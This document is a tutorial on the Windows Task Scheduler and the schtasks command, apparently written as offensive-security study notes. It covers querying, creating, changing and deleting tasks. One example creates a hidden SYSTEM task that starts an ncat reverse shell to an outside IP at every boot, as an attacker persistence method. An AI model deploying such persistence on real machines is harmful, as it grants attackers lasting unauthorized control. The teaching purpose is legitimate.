# Working with Scheduled Tasks



## 1. What Are Scheduled Tasks?

The **Task Scheduler** is a Windows component that allows you to automatically run a program or script based on a specific **trigger**.

*   **Core Idea:** It's the built-in "cron" of the Windows world, enabling "set it and forget it" automation.
*   **Security Relevance:** For an attacker, creating a scheduled task is a top-tier persistence method. They can create a task that runs at boot or user logon to execute a malicious payload (like a reverse shell), ensuring they regain access to the system even after a reboot or if their initial exploit is cleaned up.

### Common Triggers
A task can be configured to run based on a wide variety of events, including:
*   At a specific time/date.
*   On a recurring schedule (daily, weekly, monthly).
*   When the system boots up (**ONSTART**).
*   When a specific user logs on (**ONLOGON**).
*   When the computer becomes idle.

---

## 2. The `schtasks` Command

`schtasks.exe` is the primary command-line utility for creating, querying, modifying, and deleting scheduled tasks.

### Querying Tasks (`/Query`)
This is the first step in enumeration: finding out what tasks already exist on the system.

*   **Syntax:** `schtasks /Query [options]`
*   **Key Options:**
    *   `/fo <FORMAT>`: Sets the output **fo**rmat. `LIST` is very readable.
    *   `/v`: **V**erbose output, shows all details of the tasks.
    *   `/nh`: **N**o **h**eader, removes column headers from table output.
*   **Example (View all tasks in a detailed list format):**
    ```powershell
    schtasks /Query /fo LIST /v
    ```

### Creating Tasks (`/Create`)
This allows you to create a new scheduled task.

*   **Syntax:** `schtasks /Create /sc <SCHEDULE> /tn <TASKNAME> /tr <TASKTORUN> [options]`
*   **Key Parameters:**
    *   `/sc`: The **sc**hedule type (e.g., `ONSTART`, `ONLOGON`, `MINUTE`, `HOURLY`).
    *   `/tn`: The **t**ask **n**ame (must be unique).
    *   `/tr`: The **t**ask to **r**un (the command or path to the executable).
    *   `/ru`: The user to **r**un the task **u**nder (e.g., `SYSTEM` for highest privileges).
*   **Example (Creating a persistence mechanism):**
    This command creates a task named "My Secret Task" that runs `ncat.exe` to establish a reverse shell every time the system starts up.
    ```powershell
    schtasks /create /sc ONSTART /tn "My Secret Task" /tr "C:\Users\Victim\AppData\Local\ncat.exe 172.16.1.100 8100" /ru SYSTEM
    ```

### Modifying Tasks (`/Change`)
This allows you to change the properties of an existing task.

*   **Syntax:** `schtasks /Change /tn <TASKNAME> [options]`
*   **Key Parameters:**
    *   `/tr`: Change the program the task runs.
    *   `/ru`: Change the user the task runs as.
    *   `/rp`: Provide the **p**assword for the user specified with `/ru`.
    *   `/DISABLE` or `/ENABLE`: Disable or enable the task.
*   **Example (Changing the "Run As" user):**
    ```powershell
    schtasks /change /tn "My Secret Task" /ru administrator /rp "P@ssw0rd"
    ```

### Deleting Tasks (`/Delete`)
This removes a scheduled task.

*   **Syntax:** `schtasks /Delete /tn <TASKNAME> [options]`
*   **Key Parameter:**
    *   `/f`: **F**orce the deletion without a confirmation prompt.
*   **Example:**
    ```powershell
    schtasks /delete /tn "My Secret Task" /f
    ```

### Running a Task On-Demand (`/Run`)
This allows you to manually trigger a scheduled task to run immediately, which is useful for testing.

*   **Syntax:** `schtasks /Run /tn <TASKNAME>`
